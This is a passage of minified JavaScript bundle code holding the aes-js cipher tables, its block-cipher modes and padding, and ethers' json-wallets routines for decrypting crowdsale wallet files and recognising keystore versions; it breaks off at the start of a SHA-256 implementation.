71,1641816226,1517767529,470948374,3801332234,3231722213,1008918595,303765277,235474187,4069246893,766945465,337553864,1475418501,2943682380,4003061179,2743034109,4144047775,1551037884,1147550661,1543208500,2336434550,3408119516,3069049960,3102011747,3610369226,1113818384,328671808,2227573024,2236228733,3535486456,2935566865,3341394285,496906059,3702665459,226906860,2009195472,733156972,2842737049,294930682,1206477858,2835123396,2700099354,1451044056,573804783,2269728455,3644379585,2362090238,2564033334,2801107407,2776292904,3669462566,1068351396,742039012,1350078989,1784663195,1417561698,4136440770,2430122216,775550814,2193862645,2673705150,1775276924,1876241833,3475313331,3366754619,270040487,3902563182,3678124923,3441850377,1851332852,3969562369,2203032232,3868552805,2868897406,566021896,4011190502,3135740889,1248802510,3936291284,699432150,832877231,708780849,3332740144,899835584,1951317047,4236429990,3767586992,866637845,4043610186,1106041591,2144161806,395441711,1984812685,1139781709,3433712980,3835036895,2664543715,1282050075,3240894392,1181045119,2640243204,25965917,4203181171,4211818798,3009879386,2463879762,3910161971,1842759443,2597806476,933301370,1509430414,3943906441,3467192302,3076639029,3776767469,2051518780,2631065433,1441952575,404016761,1942435775,1408749034,1610459739,3745345300,2017778566,3400528769,3110650942,941896748,3265478751,371049330,3168937228,675039627,4279080257,967311729,135050206,3635733660,1683407248,2076935265,3576870512,1215061108,3501741890],S=[1347548327,1400783205,3273267108,2520393566,3409685355,4045380933,2880240216,2471224067,1428173050,4138563181,2441661558,636813900,4233094615,3620022987,2149987652,2411029155,1239331162,1730525723,2554718734,3781033664,46346101,310463728,2743944855,3328955385,3875770207,2501218972,3955191162,3667219033,768917123,3545789473,692707433,1150208456,1786102409,2029293177,1805211710,3710368113,3065962831,401639597,1724457132,3028143674,409198410,2196052529,1620529459,1164071807,3769721975,2226875310,486441376,2499348523,1483753576,428819965,2274680428,3075636216,598438867,3799141122,1474502543,711349675,129166120,53458370,2592523643,2782082824,4063242375,2988687269,3120694122,1559041666,730517276,2460449204,4042459122,2706270690,3446004468,3573941694,533804130,2328143614,2637442643,2695033685,839224033,1973745387,957055980,2856345839,106852767,1371368976,4181598602,1033297158,2933734917,1179510461,3046200461,91341917,1862534868,4284502037,605657339,2547432937,3431546947,2003294622,3182487618,2282195339,954669403,3682191598,1201765386,3917234703,3388507166,0,2198438022,1211247597,2887651696,1315723890,4227665663,1443857720,507358933,657861945,1678381017,560487590,3516619604,975451694,2970356327,261314535,3535072918,2652609425,1333838021,2724322336,1767536459,370938394,182621114,3854606378,1128014560,487725847,185469197,2918353863,3106780840,3356761769,2237133081,1286567175,3152976349,4255350624,2683765030,3160175349,3309594171,878443390,1988838185,3704300486,1756818940,1673061617,3403100636,272786309,1075025698,545572369,2105887268,4174560061,296679730,1841768865,1260232239,4091327024,3960309330,3497509347,1814803222,2578018489,4195456072,575138148,3299409036,446754879,3629546796,4011996048,3347532110,3252238545,4270639778,915985419,3483825537,681933534,651868046,2755636671,3828103837,223377554,2607439820,1649704518,3270937875,3901806776,1580087799,4118987695,3198115200,2087309459,2842678573,3016697106,1003007129,2802849917,1860738147,2077965243,164439672,4100872472,32283319,2827177882,1709610350,2125135846,136428751,3874428392,3652904859,3460984630,3572145929,3593056380,2939266226,824852259,818324884,3224740454,930369212,2801566410,2967507152,355706840,1257309336,4148292826,243256656,790073846,2373340630,1296297904,1422699085,3756299780,3818836405,457992840,3099667487,2135319889,77422314,1560382517,1945798516,788204353,1521706781,1385356242,870912086,325965383,2358957921,2050466060,2388260884,2313884476,4006521127,901210569,3990953189,1014646705,1503449823,1062597235,2031621326,3212035895,3931371469,1533017514,350174575,2256028891,2177544179,1052338372,741876788,1606591296,1914052035,213705253,2334669897,1107234197,1899603969,3725069491,2631447780,2422494913,1635502980,1893020342,1950903388,1120974935],T=[2807058932,1699970625,2764249623,1586903591,1808481195,1173430173,1487645946,59984867,4199882800,1844882806,1989249228,1277555970,3623636965,3419915562,1149249077,2744104290,1514790577,459744698,244860394,3235995134,1963115311,4027744588,2544078150,4190530515,1608975247,2627016082,2062270317,1507497298,2200818878,567498868,1764313568,3359936201,2305455554,2037970062,1047239e3,1910319033,1337376481,2904027272,2892417312,984907214,1243112415,830661914,861968209,2135253587,2011214180,2927934315,2686254721,731183368,1750626376,4246310725,1820824798,4172763771,3542330227,48394827,2404901663,2871682645,671593195,3254988725,2073724613,145085239,2280796200,2779915199,1790575107,2187128086,472615631,3029510009,4075877127,3802222185,4107101658,3201631749,1646252340,4270507174,1402811438,1436590835,3778151818,3950355702,3963161475,4020912224,2667994737,273792366,2331590177,104699613,95345982,3175501286,2377486676,1560637892,3564045318,369057872,4213447064,3919042237,1137477952,2658625497,1119727848,2340947849,1530455833,4007360968,172466556,266959938,516552836,0,2256734592,3980931627,1890328081,1917742170,4294704398,945164165,3575528878,958871085,3647212047,2787207260,1423022939,775562294,1739656202,3876557655,2530391278,2443058075,3310321856,547512796,1265195639,437656594,3121275539,719700128,3762502690,387781147,218828297,3350065803,2830708150,2848461854,428169201,122466165,3720081049,1627235199,648017665,4122762354,1002783846,2117360635,695634755,3336358691,4234721005,4049844452,3704280881,2232435299,574624663,287343814,612205898,1039717051,840019705,2708326185,793451934,821288114,1391201670,3822090177,376187827,3113855344,1224348052,1679968233,2361698556,1058709744,752375421,2431590963,1321699145,3519142200,2734591178,188127444,2177869557,3727205754,2384911031,3215212461,2648976442,2450346104,3432737375,1180849278,331544205,3102249176,4150144569,2952102595,2159976285,2474404304,766078933,313773861,2570832044,2108100632,1668212892,3145456443,2013908262,418672217,3070356634,2594734927,1852171925,3867060991,3473416636,3907448597,2614737639,919489135,164948639,2094410160,2997825956,590424639,2486224549,1723872674,3157750862,3399941250,3501252752,3625268135,2555048196,3673637356,1343127501,4130281361,3599595085,2957853679,1297403050,81781910,3051593425,2283490410,532201772,1367295589,3926170974,895287692,1953757831,1093597963,492483431,3528626907,1446242576,1192455638,1636604631,209336225,344873464,1015671571,669961897,3375740769,3857572124,2973530695,3747192018,1933530610,3464042516,935293895,3454686199,2858115069,1863638845,3683022916,4085369519,3292445032,875313188,1080017571,3279033885,621591778,1233856572,2504130317,24197544,3017672716,3835484340,3247465558,2220981195,3060847922,1551124588,1463996600],k=[4104605777,1097159550,396673818,660510266,2875968315,2638606623,4200115116,3808662347,821712160,1986918061,3430322568,38544885,3856137295,718002117,893681702,1654886325,2975484382,3122358053,3926825029,4274053469,796197571,1290801793,1184342925,3556361835,2405426947,2459735317,1836772287,1381620373,3196267988,1948373848,3764988233,3385345166,3263785589,2390325492,1480485785,3111247143,3780097726,2293045232,548169417,3459953789,3746175075,439452389,1362321559,1400849762,1685577905,1806599355,2174754046,137073913,1214797936,1174215055,3731654548,2079897426,1943217067,1258480242,529487843,1437280870,3945269170,3049390895,3313212038,923313619,679998e3,3215307299,57326082,377642221,3474729866,2041877159,133361907,1776460110,3673476453,96392454,878845905,2801699524,777231668,4082475170,2330014213,4142626212,2213296395,1626319424,1906247262,1846563261,562755902,3708173718,1040559837,3871163981,1418573201,3294430577,114585348,1343618912,2566595609,3186202582,1078185097,3651041127,3896688048,2307622919,425408743,3371096953,2081048481,1108339068,2216610296,0,2156299017,736970802,292596766,1517440620,251657213,2235061775,2933202493,758720310,265905162,1554391400,1532285339,908999204,174567692,1474760595,4002861748,2610011675,3234156416,3693126241,2001430874,303699484,2478443234,2687165888,585122620,454499602,151849742,2345119218,3064510765,514443284,4044981591,1963412655,2581445614,2137062819,19308535,1928707164,1715193156,4219352155,1126790795,600235211,3992742070,3841024952,836553431,1669664834,2535604243,3323011204,1243905413,3141400786,4180808110,698445255,2653899549,2989552604,2253581325,3252932727,3004591147,1891211689,2487810577,3915653703,4237083816,4030667424,2100090966,865136418,1229899655,953270745,3399679628,3557504664,4118925222,2061379749,3079546586,2915017791,983426092,2022837584,1607244650,2118541908,2366882550,3635996816,972512814,3283088770,1568718495,3499326569,3576539503,621982671,2895723464,410887952,2623762152,1002142683,645401037,1494807662,2595684844,1335535747,2507040230,4293295786,3167684641,367585007,3885750714,1865862730,2668221674,2960971305,2763173681,1059270954,2777952454,2724642869,1320957812,2194319100,2429595872,2815956275,77089521,3973773121,3444575871,2448830231,1305906550,4021308739,2857194700,2516901860,3518358430,1787304780,740276417,1699839814,1592394909,2352307457,2272556026,188821243,1729977011,3687994002,274084841,3594982253,3613494426,2701949495,4162096729,322734571,2837966542,1640576439,484830689,1202797690,3537852828,4067639125,349075736,3342319475,4157467219,4255800159,1030690015,1155237496,2951971274,1757691577,607398968,2738905026,499347990,3794078908,1011452712,227885567,2818666809,213114376,3034881240,1455525988,3414450555,850817237,1817998408,3092726480],I=[0,235474187,470948374,303765277,941896748,908933415,607530554,708780849,1883793496,2118214995,1817866830,1649639237,1215061108,1181045119,1417561698,1517767529,3767586992,4003061179,4236429990,4069246893,3635733660,3602770327,3299278474,3400528769,2430122216,2664543715,2362090238,2193862645,2835123396,2801107407,3035535058,3135740889,3678124923,3576870512,3341394285,3374361702,3810496343,3977675356,4279080257,4043610186,2876494627,2776292904,3076639029,3110650942,2472011535,2640243204,2403728665,2169303058,1001089995,899835584,666464733,699432150,59727847,226906860,530400753,294930682,1273168787,1172967064,1475418501,1509430414,1942435775,2110667444,1876241833,1641816226,2910219766,2743034109,2976151520,3211623147,2505202138,2606453969,2302690252,2269728455,3711829422,3543599269,3240894392,3475313331,3843699074,3943906441,4178062228,4144047775,1306967366,1139781709,1374988112,1610459739,1975683434,2076935265,1775276924,1742315127,1034867998,866637845,566021896,800440835,92987698,193195065,429456164,395441711,1984812685,2017778566,1784663195,1683407248,1315562145,1080094634,1383856311,1551037884,101039829,135050206,437757123,337553864,1042385657,807962610,573804783,742039012,2531067453,2564033334,2328828971,2227573024,2935566865,2700099354,3001755655,3168937228,3868552805,3902563182,4203181171,4102977912,3736164937,3501741890,3265478751,3433712980,1106041591,1340463100,1576976609,1408749034,2043211483,2009195472,1708848333,1809054150,832877231,1068351396,766945465,599762354,159417987,126454664,361929877,463180190,2709260871,2943682380,3178106961,3009879386,2572697195,2538681184,2236228733,2336434550,3509871135,3745345300,3441850377,3274667266,3910161971,3877198648,4110568485,4211818798,2597806476,2497604743,2261089178,2295101073,2733856160,2902087851,3202437046,2968011453,3936291284,3835036895,4136440770,4169408201,3535486456,3702665459,3467192302,3231722213,2051518780,1951317047,1716890410,1750902305,1113818384,1282050075,1584504582,1350078989,168810852,67556463,371049330,404016761,841739592,1008918595,775550814,540080725,3969562369,3801332234,4035489047,4269907996,3569255213,3669462566,3366754619,3332740144,2631065433,2463879762,2160117071,2395588676,2767645557,2868897406,3102011747,3069049960,202008497,33778362,270040487,504459436,875451293,975658646,675039627,641025152,2084704233,1917518562,1615861247,1851332852,1147550661,1248802510,1484005843,1451044056,933301370,967311729,733156972,632953703,260388950,25965917,328671808,496906059,1206477858,1239443753,1543208500,1441952575,2144161806,1908694277,1675577880,1842759443,3610369226,3644379585,3408119516,3307916247,4011190502,3776767469,4077384432,4245618683,2809771154,2842737049,3144396420,3043140495,2673705150,2438237621,2203032232,2370213795],E=[0,185469197,370938394,487725847,741876788,657861945,975451694,824852259,1483753576,1400783205,1315723890,1164071807,1950903388,2135319889,1649704518,1767536459,2967507152,3152976349,2801566410,2918353863,2631447780,2547432937,2328143614,2177544179,3901806776,3818836405,4270639778,4118987695,3299409036,3483825537,3535072918,3652904859,2077965243,1893020342,1841768865,1724457132,1474502543,1559041666,1107234197,1257309336,598438867,681933534,901210569,1052338372,261314535,77422314,428819965,310463728,3409685355,3224740454,3710368113,3593056380,3875770207,3960309330,4045380933,4195456072,2471224067,2554718734,2237133081,2388260884,3212035895,3028143674,2842678573,2724322336,4138563181,4255350624,3769721975,3955191162,3667219033,3516619604,3431546947,3347532110,2933734917,2782082824,3099667487,3016697106,2196052529,2313884476,2499348523,2683765030,1179510461,1296297904,1347548327,1533017514,1786102409,1635502980,2087309459,2003294622,507358933,355706840,136428751,53458370,839224033,957055980,605657339,790073846,2373340630,2256028891,2607439820,2422494913,2706270690,2856345839,3075636216,3160175349,3573941694,3725069491,3273267108,3356761769,4181598602,4063242375,4011996048,3828103837,1033297158,915985419,730517276,545572369,296679730,446754879,129166120,213705253,1709610350,1860738147,1945798516,2029293177,1239331162,1120974935,1606591296,1422699085,4148292826,4233094615,3781033664,3931371469,3682191598,3497509347,3446004468,3328955385,2939266226,2755636671,3106780840,2988687269,2198438022,2282195339,2501218972,2652609425,1201765386,1286567175,1371368976,1521706781,1805211710,1620529459,2105887268,1988838185,533804130,350174575,164439672,46346101,870912086,954669403,636813900,788204353,2358957921,2274680428,2592523643,2441661558,2695033685,2880240216,3065962831,3182487618,3572145929,3756299780,3270937875,3388507166,4174560061,4091327024,4006521127,3854606378,1014646705,930369212,711349675,560487590,272786309,457992840,106852767,223377554,1678381017,1862534868,1914052035,2031621326,1211247597,1128014560,1580087799,1428173050,32283319,182621114,401639597,486441376,768917123,651868046,1003007129,818324884,1503449823,1385356242,1333838021,1150208456,1973745387,2125135846,1673061617,1756818940,2970356327,3120694122,2802849917,2887651696,2637442643,2520393566,2334669897,2149987652,3917234703,3799141122,4284502037,4100872472,3309594171,3460984630,3545789473,3629546796,2050466060,1899603969,1814803222,1730525723,1443857720,1560382517,1075025698,1260232239,575138148,692707433,878443390,1062597235,243256656,91341917,409198410,325965383,3403100636,3252238545,3704300486,3620022987,3874428392,3990953189,4042459122,4227665663,2460449204,2578018489,2226875310,2411029155,3198115200,3046200461,2827177882,2743944855],C=[0,218828297,437656594,387781147,875313188,958871085,775562294,590424639,1750626376,1699970625,1917742170,2135253587,1551124588,1367295589,1180849278,1265195639,3501252752,3720081049,3399941250,3350065803,3835484340,3919042237,4270507174,4085369519,3102249176,3051593425,2734591178,2952102595,2361698556,2177869557,2530391278,2614737639,3145456443,3060847922,2708326185,2892417312,2404901663,2187128086,2504130317,2555048196,3542330227,3727205754,3375740769,3292445032,3876557655,3926170974,4246310725,4027744588,1808481195,1723872674,1910319033,2094410160,1608975247,1391201670,1173430173,1224348052,59984867,244860394,428169201,344873464,935293895,984907214,766078933,547512796,1844882806,1627235199,2011214180,2062270317,1507497298,1423022939,1137477952,1321699145,95345982,145085239,532201772,313773861,830661914,1015671571,731183368,648017665,3175501286,2957853679,2807058932,2858115069,2305455554,2220981195,2474404304,2658625497,3575528878,3625268135,3473416636,3254988725,3778151818,3963161475,4213447064,4130281361,3599595085,3683022916,3432737375,3247465558,3802222185,4020912224,4172763771,4122762354,3201631749,3017672716,2764249623,2848461854,2331590177,2280796200,2431590963,2648976442,104699613,188127444,472615631,287343814,840019705,1058709744,671593195,621591778,1852171925,1668212892,1953757831,2037970062,1514790577,1463996600,1080017571,1297403050,3673637356,3623636965,3235995134,3454686199,4007360968,3822090177,4107101658,4190530515,2997825956,3215212461,2830708150,2779915199,2256734592,2340947849,2627016082,2443058075,172466556,122466165,273792366,492483431,1047239e3,861968209,612205898,695634755,1646252340,1863638845,2013908262,1963115311,1446242576,1530455833,1277555970,1093597963,1636604631,1820824798,2073724613,1989249228,1436590835,1487645946,1337376481,1119727848,164948639,81781910,331544205,516552836,1039717051,821288114,669961897,719700128,2973530695,3157750862,2871682645,2787207260,2232435299,2283490410,2667994737,2450346104,3647212047,3564045318,3279033885,3464042516,3980931627,3762502690,4150144569,4199882800,3070356634,3121275539,2904027272,2686254721,2200818878,2384911031,2570832044,2486224549,3747192018,3528626907,3310321856,3359936201,3950355702,3867060991,4049844452,4234721005,1739656202,1790575107,2108100632,1890328081,1402811438,1586903591,1233856572,1149249077,266959938,48394827,369057872,418672217,1002783846,919489135,567498868,752375421,209336225,24197544,376187827,459744698,945164165,895287692,574624663,793451934,1679968233,1764313568,2117360635,1933530610,1343127501,1560637892,1243112415,1192455638,3704280881,3519142200,3336358691,3419915562,3907448597,3857572124,4075877127,4294704398,3029510009,3113855344,2927934315,2744104290,2159976285,2377486676,2594734927,2544078150],N=[0,151849742,303699484,454499602,607398968,758720310,908999204,1059270954,1214797936,1097159550,1517440620,1400849762,1817998408,1699839814,2118541908,2001430874,2429595872,2581445614,2194319100,2345119218,3034881240,3186202582,2801699524,2951971274,3635996816,3518358430,3399679628,3283088770,4237083816,4118925222,4002861748,3885750714,1002142683,850817237,698445255,548169417,529487843,377642221,227885567,77089521,1943217067,2061379749,1640576439,1757691577,1474760595,1592394909,1174215055,1290801793,2875968315,2724642869,3111247143,2960971305,2405426947,2253581325,2638606623,2487810577,3808662347,3926825029,4044981591,4162096729,3342319475,3459953789,3576539503,3693126241,1986918061,2137062819,1685577905,1836772287,1381620373,1532285339,1078185097,1229899655,1040559837,923313619,740276417,621982671,439452389,322734571,137073913,19308535,3871163981,4021308739,4104605777,4255800159,3263785589,3414450555,3499326569,3651041127,2933202493,2815956275,3167684641,3049390895,2330014213,2213296395,2566595609,2448830231,1305906550,1155237496,1607244650,1455525988,1776460110,1626319424,2079897426,1928707164,96392454,213114376,396673818,514443284,562755902,679998e3,865136418,983426092,3708173718,3557504664,3474729866,3323011204,4180808110,4030667424,3945269170,3794078908,2507040230,2623762152,2272556026,2390325492,2975484382,3092726480,2738905026,2857194700,3973773121,3856137295,4274053469,4157467219,3371096953,3252932727,3673476453,3556361835,2763173681,2915017791,3064510765,3215307299,2156299017,2307622919,2459735317,2610011675,2081048481,1963412655,1846563261,1729977011,1480485785,1362321559,1243905413,1126790795,878845905,1030690015,645401037,796197571,274084841,425408743,38544885,188821243,3613494426,3731654548,3313212038,3430322568,4082475170,4200115116,3780097726,3896688048,2668221674,2516901860,2366882550,2216610296,3141400786,2989552604,2837966542,2687165888,1202797690,1320957812,1437280870,1554391400,1669664834,1787304780,1906247262,2022837584,265905162,114585348,499347990,349075736,736970802,585122620,972512814,821712160,2595684844,2478443234,2293045232,2174754046,3196267988,3079546586,2895723464,2777952454,3537852828,3687994002,3234156416,3385345166,4142626212,4293295786,3841024952,3992742070,174567692,57326082,410887952,292596766,777231668,660510266,1011452712,893681702,1108339068,1258480242,1343618912,1494807662,1715193156,1865862730,1948373848,2100090966,2701949495,2818666809,3004591147,3122358053,2235061775,2352307457,2535604243,2653899549,3915653703,3764988233,4219352155,4067639125,3444575871,3294430577,3746175075,3594982253,836553431,953270745,600235211,718002117,367585007,484830689,133361907,251657213,2041877159,1891211689,1806599355,1654886325,1568718495,1418573201,1335535747,1184342925];function L(B){for(var M=[],W=0;W<B.length;W+=4)M.push(B[W]<<24|B[W+1]<<16|B[W+2]<<8|B[W+3]);return M}var $=function(B){if(!(this instanceof $))throw Error("AES must be instanitated with `new`");Object.defineProperty(this,"key",{value:s(B,!0)}),this._prepare()};$.prototype._prepare=function(){var B=u[this.key.length];if(B==null)throw new Error("invalid key size (must be 16, 24 or 32 bytes)");this._Ke=[],this._Kd=[];for(var M=0;M<=B;M++)this._Ke.push([0,0,0,0]),this._Kd.push([0,0,0,0]);for(var W=(B+1)*4,K=this.key.length/4,q=L(this.key),J,M=0;M<K;M++)J=M>>2,this._Ke[J][M%4]=q[M],this._Kd[B-J][M%4]=q[M];for(var le=0,ae=K,U;ae<W;){if(U=q[K-1],q[0]^=h[U>>16&255]<<24^h[U>>8&255]<<16^h[U&255]<<8^h[U>>24&255]^d[le]<<24,le+=1,K!=8)for(var M=1;M<K;M++)q[M]^=q[M-1];else{for(var M=1;M<K/2;M++)q[M]^=q[M-1];U=q[K/2-1],q[K/2]^=h[U&255]^h[U>>8&255]<<8^h[U>>16&255]<<16^h[U>>24&255]<<24;for(var M=K/2+1;M<K;M++)q[M]^=q[M-1]}for(var M=0,G,Z;M<K&&ae<W;)G=ae>>2,Z=ae%4,this._Ke[G][Z]=q[M],this._Kd[B-G][Z]=q[M++],ae++}for(var G=1;G<B;G++)for(var Z=0;Z<4;Z++)U=this._Kd[G][Z],this._Kd[G][Z]=I[U>>24&255]^E[U>>16&255]^C[U>>8&255]^N[U&255]},$.prototype.encrypt=function(B){if(B.length!=16)throw new Error("invalid plaintext size (must be 16 bytes)");for(var M=this._Ke.length-1,W=[0,0,0,0],K=L(B),q=0;q<4;q++)K[q]^=this._Ke[0][q];for(var J=1;J<M;J++){for(var q=0;q<4;q++)W[q]=p[K[q]>>24&255]^g[K[(q+1)%4]>>16&255]^w[K[(q+2)%4]>>8&255]^m[K[(q+3)%4]&255]^this._Ke[J][q];K=W.slice()}for(var le=o(16),ae,q=0;q<4;q++)ae=this._Ke[M][q],le[4*q]=(h[K[q]>>24&255]^ae>>24)&255,le[4*q+1]=(h[K[(q+1)%4]>>16&255]^ae>>16)&255,le[4*q+2]=(h[K[(q+2)%4]>>8&255]^ae>>8)&255,le[4*q+3]=(h[K[(q+3)%4]&255]^ae)&255;return le},$.prototype.decrypt=function(B){if(B.length!=16)throw new Error("invalid ciphertext size (must be 16 bytes)");for(var M=this._Kd.length-1,W=[0,0,0,0],K=L(B),q=0;q<4;q++)K[q]^=this._Kd[0][q];for(var J=1;J<M;J++){for(var q=0;q<4;q++)W[q]=x[K[q]>>24&255]^S[K[(q+3)%4]>>16&255]^T[K[(q+2)%4]>>8&255]^k[K[(q+1)%4]&255]^this._Kd[J][q];K=W.slice()}for(var le=o(16),ae,q=0;q<4;q++)ae=this._Kd[M][q],le[4*q]=(f[K[q]>>24&255]^ae>>24)&255,le[4*q+1]=(f[K[(q+3)%4]>>16&255]^ae>>16)&255,le[4*q+2]=(f[K[(q+2)%4]>>8&255]^ae>>8)&255,le[4*q+3]=(f[K[(q+1)%4]&255]^ae)&255;return le};var y=function(B){if(!(this instanceof y))throw Error("AES must be instanitated with `new`");this.description="Electronic Code Block",this.name="ecb",this._aes=new $(B)};y.prototype.encrypt=function(B){if(B=s(B),B.length%16!==0)throw new Error("invalid plaintext size (must be multiple of 16 bytes)");for(var M=o(B.length),W=o(16),K=0;K<B.length;K+=16)a(B,W,0,K,K+16),W=this._aes.encrypt(W),a(W,M,K);return M},y.prototype.decrypt=function(B){if(B=s(B),B.length%16!==0)throw new Error("invalid ciphertext size (must be multiple of 16 bytes)");for(var M=o(B.length),W=o(16),K=0;K<B.length;K+=16)a(B,W,0,K,K+16),W=this._aes.decrypt(W),a(W,M,K);return M};var A=function(B,M){if(!(this instanceof A))throw Error("AES must be instanitated with `new`");if(this.description="Cipher Block Chaining",this.name="cbc",!M)M=o(16);else if(M.length!=16)throw new Error("invalid initialation vector size (must be 16 bytes)");this._lastCipherblock=s(M,!0),this._aes=new $(B)};A.prototype.encrypt=function(B){if(B=s(B),B.length%16!==0)throw new Error("invalid plaintext size (must be multiple of 16 bytes)");for(var M=o(B.length),W=o(16),K=0;K<B.length;K+=16){a(B,W,0,K,K+16);for(var q=0;q<16;q++)W[q]^=this._lastCipherblock[q];this._lastCipherblock=this._aes.encrypt(W),a(this._lastCipherblock,M,K)}return M},A.prototype.decrypt=function(B){if(B=s(B),B.length%16!==0)throw new Error("invalid ciphertext size (must be multiple of 16 bytes)");for(var M=o(B.length),W=o(16),K=0;K<B.length;K+=16){a(B,W,0,K,K+16),W=this._aes.decrypt(W);for(var q=0;q<16;q++)M[K+q]=W[q]^this._lastCipherblock[q];a(B,this._lastCipherblock,0,K,K+16)}return M};var b=function(B,M,W){if(!(this instanceof b))throw Error("AES must be instanitated with `new`");if(this.description="Cipher Feedback",this.name="cfb",!M)M=o(16);else if(M.length!=16)throw new Error("invalid initialation vector size (must be 16 size)");W||(W=1),this.segmentSize=W,this._shiftRegister=s(M,!0),this._aes=new $(B)};b.prototype.encrypt=function(B){if(B.length%this.segmentSize!=0)throw new Error("invalid plaintext size (must be segmentSize bytes)");for(var M=s(B,!0),W,K=0;K<M.length;K+=this.segmentSize){W=this._aes.encrypt(this._shiftRegister);for(var q=0;q<this.segmentSize;q++)M[K+q]^=W[q];a(this._shiftRegister,this._shiftRegister,0,this.segmentSize),a(M,this._shiftRegister,16-this.segmentSize,K,K+this.segmentSize)}return M},b.prototype.decrypt=function(B){if(B.length%this.segmentSize!=0)throw new Error("invalid ciphertext size (must be segmentSize bytes)");for(var M=s(B,!0),W,K=0;K<M.length;K+=this.segmentSize){W=this._aes.encrypt(this._shiftRegister);for(var q=0;q<this.segmentSize;q++)M[K+q]^=W[q];a(this._shiftRegister,this._shiftRegister,0,this.segmentSize),a(B,this._shiftRegister,16-this.segmentSize,K,K+this.segmentSize)}return M};var v=function(B,M){if(!(this instanceof v))throw Error("AES must be instanitated with `new`");if(this.description="Output Feedback",this.name="ofb",!M)M=o(16);else if(M.length!=16)throw new Error("invalid initialation vector size (must be 16 bytes)");this._lastPrecipher=s(M,!0),this._lastPrecipherIndex=16,this._aes=new $(B)};v.prototype.encrypt=function(B){for(var M=s(B,!0),W=0;W<M.length;W++)this._lastPrecipherIndex===16&&(this._lastPrecipher=this._aes.encrypt(this._lastPrecipher),this._lastPrecipherIndex=0),M[W]^=this._lastPrecipher[this._lastPrecipherIndex++];return M},v.prototype.decrypt=v.prototype.encrypt;var _=function(B){if(!(this instanceof _))throw Error("Counter must be instanitated with `new`");B!==0&&!B&&(B=1),typeof B=="number"?(this._counter=o(16),this.setValue(B)):this.setBytes(B)};_.prototype.setValue=function(B){if(typeof B!="number"||parseInt(B)!=B)throw new Error("invalid counter value (must be an integer)");for(var M=15;M>=0;--M)this._counter[M]=B%256,B=B>>8},_.prototype.setBytes=function(B){if(B=s(B,!0),B.length!=16)throw new Error("invalid counter bytes size (must be 16 bytes)");this._counter=B},_.prototype.increment=function(){for(var B=15;B>=0;B--)if(this._counter[B]===255)this._counter[B]=0;else{this._counter[B]++;break}};var O=function(B,M){if(!(this instanceof O))throw Error("AES must be instanitated with `new`");this.description="Counter",this.name="ctr",M instanceof _||(M=new _(M)),this._counter=M,this._remainingCounter=null,this._remainingCounterIndex=16,this._aes=new $(B)};O.prototype.encrypt=function(B){for(var M=s(B,!0),W=0;W<M.length;W++)this._remainingCounterIndex===16&&(this._remainingCounter=this._aes.encrypt(this._counter._counter),this._remainingCounterIndex=0,this._counter.increment()),M[W]^=this._remainingCounter[this._remainingCounterIndex++];return M},O.prototype.decrypt=O.prototype.encrypt;function D(B){B=s(B,!0);var M=16-B.length%16,W=o(B.length+M);a(B,W);for(var K=B.length;K<W.length;K++)W[K]=M;return W}function R(B){if(B=s(B,!0),B.length<16)throw new Error("PKCS#7 invalid length");var M=B[B.length-1];if(M>16)throw new Error("PKCS#7 padding byte out of range");for(var W=B.length-M,K=0;K<M;K++)if(B[W+K]!==M)throw new Error("PKCS#7 invalid padding byte");var q=o(W);return a(B,q,0,0,W),q}var P={AES:$,Counter:_,ModeOfOperation:{ecb:y,cbc:A,cfb:b,ofb:v,ctr:O},utils:{hex:l,utf8:c},padding:{pkcs7:{pad:D,strip:R}},_arrayTest:{coerceArray:s,createArray:o,copyArray:a}};r.exports=P})()}(t_)),t_.exports}var Lue=Due();const pd=Ss(Lue),rY="json-wallets/5.8.0";function P1(r){return typeof r=="string"&&r.substring(0,2)!=="0x"&&(r="0x"+r),ze(r)}function tb(r,e){for(r=String(r);r.length<e;)r="0"+r;return r}function S$(r){return typeof r=="string"?Fn(r,Td.NFKC):ze(r)}function Gn(r,e){let t=r;const i=e.toLowerCase().split("/");for(let n=0;n<i.length;n++){let s=null;for(const o in t)if(o.toLowerCase()===i[n]){s=t[o];break}if(s===null)return null;t=s}return t}function Uue(r){const e=ze(r);e[6]=e[6]&15|64,e[8]=e[8]&63|128;const t=Qe(e);return[t.substring(2,10),t.substring(10,14),t.substring(14,18),t.substring(18,22),t.substring(22,34)].join("-")}const jue=new be(rY);class Fue extends xp{isCrowdsaleAccount(e){return!!(e&&e._isCrowdsaleAccount)}}function A$(r,e){const t=JSON.parse(r);e=S$(e);const i=Oi(Gn(t,"ethaddr")),n=P1(Gn(t,"encseed"));(!n||n.length%16!==0)&&jue.throwArgumentError("invalid encseed","json",r);const s=ze(E$(e,e,2e3,32,"sha256")).slice(0,16),o=n.slice(0,16),a=n.slice(16),c=new pd.ModeOfOperation.cbc(s,o),l=pd.padding.pkcs7.strip(ze(c.decrypt(a)));let u="";for(let f=0;f<l.length;f++)u+=String.fromCharCode(l[f]);const d=Fn(u),h=Ui(d);return new Fue({_isCrowdsaleAccount:!0,address:i,privateKey:h})}function jx(r){let e=null;try{e=JSON.parse(r)}catch{return!1}return e.encseed&&e.ethaddr}function Fx(r){let e=null;try{e=JSON.parse(r)}catch{return!1}return!(!e.version||parseInt(e.version)!==e.version||parseInt(e.version)!==3)}function que(r){if(jx(r))try{return Oi(JSON.parse(r).ethaddr)}catch{return null}if(Fx(r))try{return Oi(JSON.parse(r).address)}catch{return null}return null}var r_={exports:{}},BM;function zue(){return BM||(BM=1,function(r,e){(function(t){function n(g){const w=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]);let m=1779033703,x=3144134277,S=1013904242,T=2773480762,k=1359893119,I=2600822924,E=528734635,C=1541459225;const N=new Uint32Array(64);function L(O){let D=0,R=O.length;for(;R>=64;){let 